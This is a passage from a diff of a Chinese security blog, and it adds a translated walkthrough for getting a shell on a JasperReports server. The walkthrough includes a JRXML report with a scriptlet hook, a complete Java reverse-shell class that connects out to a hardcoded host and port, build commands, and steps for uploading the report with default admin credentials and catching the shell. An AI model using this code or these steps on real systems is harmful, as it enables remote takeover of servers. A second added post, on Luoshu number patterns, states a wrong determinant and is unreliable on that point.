class="attr">width</span>=<span class="string">"240"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"23562605-5611-41d8-8a40-98ad9d28834a"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;name&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">uuid</span>=<span class="string">"4612e5a3-cb0d-4533-9b54-9ad9828acbed"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"d81f1db2-9f2e-4665-aa47-3d1a49cc9d15"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"10"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Phone"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"e48d7dee-a092-45ea-8bd8-8440f76a9fd0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">uuid</span>=<span class="string">"f0397b7d-4130-4b13-88b1-d89415b269bd"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"0a1206b8-d0d6-4809-a424-3d7f09606b44"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Address"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"7bc63c7e-0224-441b-96ec-8a1bb67a0b84"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnGroup</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:table</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jasperReport</span>&gt;</span></div><div class="line"></div><div class="line">接下来看42行：</div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"></div><div class="line">这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line">这很简单,但这在Java代码本身是如何定义的呢?</div><div class="line"></div><div class="line">编写攻击脚本</div><div class="line"></div><div class="line">scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从<span class="string">"here"</span>中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：</div><div class="line"></div><div class="line"><span class="keyword">package</span> foxglove.shell;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> java.net.*;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"><span class="keyword">import</span> java.io.DataInputStream;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRDefaultScriptlet;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRScriptletException;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellScriptlet</span> <span class="keyword">extends</span> <span class="title">JRDefaultScriptlet</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</div><div class="line">   Socket socket;</div><div class="line"> </div><div class="line">   PrintWriter socketWrite;</div><div class="line">   BufferedReader socketRead;</div><div class="line"> </div><div class="line">   PrintWriter commandWrite;</div><div class="line">   BufferedReader commandRead;</div><div class="line"> </div><div class="line">   <span class="keyword">static</span> String ip;</div><div class="line">   <span class="keyword">int</span> port = <span class="number">8080</span>;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getShell</span><span class="params">()</span></span>&#123;</div><div class="line">      ip = <span class="string">"1.1.1.1"</span>;</div><div class="line">      ShellScriptlet shell = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      shell.establishConnection();</div><div class="line">      <span class="keyword">new</span> Thread(shell).start();</div><div class="line">      shell.getCommand();</div><div class="line">      <span class="keyword">return</span> <span class="string">"DONE"</span>;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">      spawnShell();</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spawnShell</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">boolean</span> windows = <span class="keyword">false</span>;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</div><div class="line">            windows = <span class="keyword">true</span>;</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         Runtime rt = Runtime.getRuntime();</div><div class="line">         Process p;</div><div class="line">         <span class="keyword">if</span>(windows) p = rt.exec(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>);</div><div class="line">         <span class="keyword">else</span> p = rt.exec(<span class="string">"/bin/sh"</span>);</div><div class="line"> </div><div class="line">         InputStream readme = p.getInputStream();</div><div class="line">         OutputStream writeme = p.getOutputStream();</div><div class="line">         commandWrite = <span class="keyword">new</span> PrintWriter(writeme);</div><div class="line">         commandRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(readme));</div><div class="line"> </div><div class="line">         <span class="keyword">if</span>(windows) commandWrite.println(<span class="string">"dir"</span>);</div><div class="line">         <span class="keyword">else</span> commandWrite.println(<span class="string">"ls -al"</span>);</div><div class="line"> </div><div class="line">         commandWrite.flush();</div><div class="line"> </div><div class="line">         String line;</div><div class="line">         <span class="keyword">while</span>((line = commandRead.readLine()) != <span class="keyword">null</span>)&#123;</div><div class="line">            socketWrite.println(line);</div><div class="line">            socketWrite.flush();</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         p.destroy();</div><div class="line"> </div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">establishConnection</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         socket = <span class="keyword">new</span> Socket(ip,port);</div><div class="line">         socketWrite = <span class="keyword">new</span> PrintWriter(socket.getOutputStream(),<span class="keyword">true</span>);</div><div class="line">         socketRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</div><div class="line">         socketWrite.println(<span class="string">"---Connection has been established---"</span>);</div><div class="line">         socketWrite.flush();</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCommand</span><span class="params">()</span></span>&#123;</div><div class="line">      String foo;</div><div class="line"> </div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">while</span>((foo=socketRead.readLine())!= <span class="keyword">null</span>)&#123;</div><div class="line">            commandWrite.println(foo);</div><div class="line">            commandWrite.flush();</div><div class="line">         &#125;</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</div><div class="line">      ShellScriptlet r = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      r.getShell();</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .</div></pre></td></tr></table></figure>
+<p>这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！</p>
+<p>接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/</div></pre></td></tr></table></figure>
+<p>如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！</p>
+<h4 id="部署这个新的“Report”"><a href="#部署这个新的“Report”" class="headerlink" title="部署这个新的“Report”"></a>部署这个新的“Report”</h4><p>每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。</p>
+<p>首先很明显我们要去验证一下“jasperadmin/jasperadmin”：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/authd.png?w=960" alt="authd.png"></p>
+<p>在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。</p>
+<p>接下来，我们只要右击一个report并且点击“Edit”就好。</p>
+<p>一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resource.png?w=960" alt="resource.png"></p>
+<p>点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resources2.png?w=960" alt="resources2"></p>
+<p>Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resourcesadded.png?w=960" alt="resourcesadded"></p>
+<p>现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈</p>
+<h4 id="Shellz"><a href="#Shellz" class="headerlink" title="Shellz!"></a>Shellz!</h4><p>先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/listener.png?w=960" alt="listener.png"></p>
+<p>之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。</p>
+<p><img src="https://foxglovesecurity.files.wordpress.com/2016/10/shell1.png?w=960" alt="shell"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/洛书中的数字规律/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/洛书中的数字规律/" itemprop="url">
+                  洛书中的数字规律
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:57:34+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/洛书中的数字规律/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/洛书中的数字规律/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/洛书中的数字规律/" class="leancloud_visitors" data-flag-title="洛书中的数字规律">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><img src="http://ok44mzy2k.bkt.clouddn.com/luoshu-1.png" alt="1"></p>
+<h2 id="数字规律"><a href="#数字规律" class="headerlink" title="数字规律"></a>数字规律</h2><p><a href="undefined">编辑</a></p>
+<p>那么<a href="http://baike.baidu.com/view/102528.htm" target="_blank" rel="external">河图洛书</a>中真的隐含着宇宙之理吗？其内容又是什么呢？我在这里只能先谈洛书，即<a href="http://baike.baidu.com/view/97444.htm" target="_blank" rel="external">九宫图</a>。把九宫图中的数字排列来进行详解一番，或可看出一定道理来。首先在九宫图中数字之和等于十五，这一点恐怕所有的人都知道，就是横坚斜相加都等于十五。</p>
+<p>4+9+2=15</p>
+<p>3+5+7=15</p>
+<p>8+1+6=15</p>
+<p>4+3+8=15</p>
+<p>9+5+1=15</p>
+<p>2+7+6=15</p>
+<p>4+5+6=15</p>
+<p>2+5+8=15</p>
+<p>除此之外，还有什么数字玄机呢？</p>
+<p>a+b+c=d+e+f</p>
+<p>a^2+b^2+c^2=d^2+e^2+f^2</p>
+<p>我们以左列的438与右列的276为例加以说明。当我们把数递变为两位数相加时，左右两列数字之和依然相等。即43+38+84=27+76+62。从下向上递变依然成立。即83+34+48=67+72+26。</p>
+<p>递变为三位数依然相等，即438+384+843=276+762+627。</p>
+<p>从下向上递数依然成立，即834+348+483=672+726+267。</p>
+<p>再这样递变下去为四位数、五位数、六位数，一百位数、一千位数依然成立。神奇之处还不在这里，更为神奇的是不管是一位，还是两位数三位数的平方相加和依然可以左右相等。比如两位数即43^2+38^2+84^2=27^2+76^2+62^2。</p>
+<p>三位数四位数平方和依然可以成立。也就是说一百位也好一千位也好都可以成立。这个数字的神奇排列真是让我莫名惊诧。</p>
+<p>再有就是把九宫图用行列式的方法计算，可以得到一个周天数360。在这些数字面前，我不敢想象，这样一个数字排竟然有着不可思议的魔力。</p>
+<p>det[4 ，9， 2；3，5，7；8，1，6]=360</p>
+<p>就是这样的一个九宫数的排列解开了美国数学家提出的数学怪题，严格等平方和的问题，当时可是无人能解的数学怪题，就连计算机都无能为力。结果被研究洛书的彭绍定数学教授攻克。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Brainfuck/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -524,1311 +1901,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/win7使用wget/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/win7使用wget/" itemprop="url">
-                  win7使用wget
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:49:17+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/win7使用wget/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/win7使用wget/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/win7使用wget/" class="leancloud_visitors" data-flag-title="win7使用wget">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
